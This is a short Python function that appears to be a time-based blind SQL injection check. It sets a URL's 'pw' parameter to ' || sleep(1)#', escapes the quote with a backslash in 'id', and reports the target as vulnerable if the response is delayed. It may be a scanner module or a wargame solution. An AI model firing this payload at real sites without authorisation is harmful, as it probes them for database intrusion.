from time import time
from requests import get

from urllib.parse import urlparse, parse_qs


def go(k):
    o = urlparse(k['url'])
    query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    if 'pw' in query:
        query['pw'] = ' || sleep(1)#'
        query['id'] = '\\'
        a1 = time()
        get(url, params=query)
        a2 = time()
        if a2 - a1 >= 1:
            return True
    else:
        return False
